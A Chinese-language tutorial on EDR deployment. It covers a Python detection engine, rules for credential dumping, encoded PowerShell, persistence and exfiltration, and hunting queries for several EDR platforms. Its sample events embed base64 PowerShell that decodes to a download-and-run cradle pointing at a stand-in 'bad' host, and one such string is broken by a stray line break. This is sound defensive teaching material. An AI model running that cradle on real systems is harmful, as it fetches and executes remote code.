---
id: "37-001"
title: "EDR部署与检测规则 (EDR Deployment & Detection Rules)"
category: "端点安全"
category_en: "Endpoint Security"
difficulty: "★★★★"
tools: "CrowdStrike Falcon, Microsoft Defender, SentinelOne, Elastic EDR, Velociraptor"
last_updated: "2026-05"
tags: [edr, endpoint-detection, response, detection-rules, endpoint-security]
subdomain: endpoint-security
nist_csf: [DE.CM-01, DE.CM-04, DE.AE-02, RS.AN-01]
mitre_attack: [T1059, T1071, T1546, T1562, T1564]
---

# EDR部署与检测规则 (EDR Deployment & Detection Rules)

## 概述

端点检测与响应（EDR）是企业安全防御的核心产品。EDR 通过在端点采集大量数据，结合规则和算法检测恶意行为。本技能覆盖 EDR 部署架构、检测规则编写、事件调查和响应行动。

## 核心技能

### 1. EDR 架构与遥测

```python
"""EDR 架构与遥测模型"""

class EDRAnalytics:
    """EDR 分析引擎"""
    
    # EDR 遥测数据源
    TELEMETRY_SOURCES = {
        "process": ["进程创建/终止", "命令行参数", "父进程关系", "进程注入"],
        "file": ["文件创建/修改/删除", "文件重命名", "文件权限变更"],
        "network": ["网络连接", "DNS 查询", "HTTP 请求", "TLS 握手"],
        "registry": ["注册表修改", "注册表项创建", "RunKeys 修改"],
        "memory": ["内存分配", "代码注入", "DLL 加载"],
        "system": ["服务创建/修改", "计划任务", "驱动程序加载", "WMI 事件"]
    }
    
    @staticmethod
    def edr_detection_methods():
        """EDR 检测方法"""
        return {
            "signature_based": "基于 IOCs 的签名匹配（已知威胁）",
            "behavioral": "基于行为模式的检测（未知威胁）",
            "ml_based": "基于机器学习的异常检测",
            "threat_intel": "基于威胁情报的关联检测",
            "hunting": "基于假设的主动威胁狩猎"
        }
    
    @staticmethod
    def suspicious_process_chain(process_tree):
        """检测可疑进程链"""
        alerts = []
        
        # Office → Shell → Network
        office_procs = ["WINWORD.EXE", "EXCEL.EXE", "OUTLOOK.EXE", "POWERPNT.EXE"]
        suspicious_shells = ["cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe", "regsvr32.exe"]
        
        for proc in process_tree:
            if proc.get("parent") in office_procs and proc.get("name") in suspicious_shells:
                alerts.append({
                    "alert": "Office 进程生成可疑子进程",
                    "severity": "HIGH",
                    "process": proc["name"],
                    "parent": proc["parent"],
                    "command": proc.get("command", ""),
                    "mitre_attack": "T1566.001, T1204.002"
                })
            
            # 从临时目录运行的可执行文件
            if any(temp in proc.get("path", "").lower() 
                   for temp in ["\\temp\\", "\\appdata\\local\\temp"]) \
               and proc.get("name", "").endswith(".exe"):
                alerts.append({
                    "alert": "从临时目录执行的可执行文件",
                    "severity": "MEDIUM",
                    "process": proc["name"],
                    "path": proc["path"]
                })
        
        return alerts

# 使用示例
engine = EDRAnalytics()
alerts = engine.suspicious_process_chain([
    {"name": "powershell.exe", "parent": "WINWORD.EXE", 
     "command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQA'
.AaQBwACcAKQA=", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"}
])
for a in alerts:
    print(f"[{a['severity']}] {a['alert']}: {a['command'][:50]}...")
```

### 2. EDR 检测规则

```python
"""EDR 检测规则引擎"""

class EDRDetectionRules:
    """EDR 检测规则"""
    
    def __init__(self):
        self.rules = []
    
    def add_rule(self, name, mitre_id, severity, condition, platform="windows"):
        """添加检测规则"""
        rule = {
            "name": name,
            "mitre_id": mitre_id,
            "severity": severity,
            "condition": condition,
            "platform": platform
        }
        self.rules.append(rule)
        return rule
    
    def load_builtin_rules(self):
        """加载内置规则"""
        builtin_rules = [
            # 凭证访问
            ("LSASS Access via Mimikatz", "T1003.001", "CRITICAL",
             "process.access == 'lsass.exe' AND process.name IN ('procdump.exe', 'procDump64.exe', 'sqldumper.exe')"),
            
            # 执行
            ("PowerShell EncodedCommand", "T1059.001", "HIGH",
             "process.name == 'powershell.exe' AND args contains '-EncodedCommand'"),
            
            # 持久化
            ("Registry Run Key Modification", "T1547.001", "MEDIUM",
             "registry.path contains 'CurrentVersion\\Run' AND process.name NOT IN ('explorer.exe', 'msiexec.exe')"),
            
            # 防御绕过
            ("Windows Defender Disabled", "T1562.001", "HIGH",
             "registry.path contains 'DisableAntiSpyware' AND registry.value == 1"),
            
            # 凭据窃取
            ("SAM Registry Hive Access", "T1003.002", "CRITICAL",
             "process.access == 'SAM' AND process.name NOT IN ('lsass.exe', 'winlogon.exe')"),
            
            # 横向移动
            ("WMI Process Creation", "T1047", "HIGH",
             "process.parent.name == 'wmiprvse.exe' AND process.name IN ('cmd.exe', 'powershell.exe')"),
            
            # 数据外传
            ("Large Outbound File Transfer", "T1048", "MEDIUM",
             "network.outbound.bytes > 100MB AND process.name IN ('powershell.exe', 'curl.exe', 'bitsadmin.exe')"),
        ]
        
        for name, mitre_id, severity, condition in builtin_rules:
            self.add_rule(name, mitre_id, severity, condition)
        
        return len(builtin_rules)
    
    def evaluate(self, event):
        """评估事件"""
        matches = []
        for rule in self.rules:
            # 简化的规则匹配
            matched = False
            condition = rule["condition"]
            
            # 基本匹配逻辑
            if "process.name" in condition:
                proc_name = event.get("process", {}).get("name", "")
                if proc_name and proc_name.lower() in condition.lower():
                    matched = True
            
            if matched:
                matches.append({
                    "rule": rule["name"],
                    "mitre_id": rule["mitre_id"],
                    "severity": rule["severity"],
                    "event": event
                })
        
        return matches
    
    def generate_sigma_rule(self, rule):
        """生成 Sigma 规则"""
        sigma = {
            "title": rule["name"],
            "id": f"rule-{hash(rule['name']) & 0xffffffff:08x}",
            "status": "production",
            "description": f"Detects {rule['name']}",
            "tags": [f"attack.{rule['mitre_id'].split('.')[0]}", f"attack.{rule['mitre_id']}"],
            "logsource": {"category": "process_creation", "product": rule["platform"]},
            "detection": {
                "selection": {
                    "CommandLine|contains": rule["condition"].split("'")[1] if "'" in rule["condition"] else ""
                },
                "condition": "selection"
            },
            "level": rule["severity"].lower()
        }
        return sigma

# 使用示例
detection = EDRDetectionRules()
count = detection.load_builtin_rules()
print(f"Loaded {count} detection rules")

# 模拟检测
event = {"process": {"name": "powershell.exe", "pid": 1234, 
                     "args": "-EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBpAHAAJwApAA==",
                     "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}
matches = detection.evaluate(event)
for m in matches:
    print(f"[{m['severity']}] {m['rule']} ({m['mitre_id']})")
```

### 3. EDR 事件调查

```powershell
# CrowdStrike Falcon — 事件调查

# 使用 Falcon PowerShell 模块
Install-Module -Name CrowdStrike

# 查询进程创建事件
Get-CSEvent -EventType ProcessRollup2 -Filter "CommandLine.contains('powershell')" -Limit 100

# 查询网络连接事件
Get-CSEvent -EventType NetworkConnectIP4 -Filter "RemoteIP='185.220.101.50'" -Limit 50

# 查询 DNS 请求
Get-CSEvent -EventType DnsRequest -Filter "Domain='evil.com'" -Limit 100

# 文件操作
Get-CSEvent -EventType FileWritten -Filter "FileName='mimikatz.exe'" -Limit 50

# Microsoft Defender for Endpoint
# 高级狩猎查询
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ('powershell.exe', 'cmd.exe')
| where ProcessCommandLine contains '-EncodedCommand'
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| limit 100

# 横向移动检测
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemotePort == 445
| where ActionType == 'ConnectionSuccess'
| summarize ConnectionCount = count() by DeviceName, RemoteIP
| where ConnectionCount > 10

# Elastic EDR — 事件查询
# 进程事件
GET .ds-logs-endpoint.events.process-*/_search
{
  "query": {
    "bool": {
      "filter": [
        {"term": {"event.type": "start"}},
        {"term": {"process.name": "powershell.exe"}},
        {"wildcard": {"process.args": "*-EncodedCommand*"}}
      ]
    }
  }
}

# Velociraptor — 开源 EDR
# 查询进程
SELECT Pid, Name, CommandLine FROM pslist()
WHERE Name =~ 'powershell'

# 查询网络连接
SELECT Pid, Name, RemoteAddress, RemotePort FROM netstat()
WHERE RemoteAddress =~ '185\\.220\\.'

# 收集事件日志
SELECT * FROM parse_evtx(filename='C:\\Windows\\System32\\winevt\\Logs\\Security.evtx')
WHERE EventID == 4688 AND EventData.CommandLine =~ 'powershell'
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| CrowdStrike Falcon | EDR 平台 | https://www.crowdstrike.com/ |
| Microsoft Defender | EDR/XDR | https://www.microsoft.com/en-us/security/business/siem-and-xdr/microsoft-defender |
| SentinelOne | AI 驱动 EDR | https://www.sentinelone.com/ |
| Elastic EDR | 开源 EDR | https://www.elastic.co/security |
| Velociraptor | 开源端点取证 | https://github.com/Velocidex/velociraptor |

## 参考资源

- [EDR Detection Engineering — Mitre Engenuity](https://mitre-engenuity.org/cybersecurity/center-for-threat-informed-defense/)
- [CrowdStrike Event Streams API](https://www.crowdstrike.com/blog/tech-center/event-streams-api/)
- [Microsoft Defender Hunting Queries](https://learn.microsoft.com/en-us/microsoft-365/security/defender/advanced-hunting-example)
- [Elastic Detection Rules](https://github.com/elastic/detection-rules)
- [Velociraptor Documentation](https://docs.velociraptor.app/)
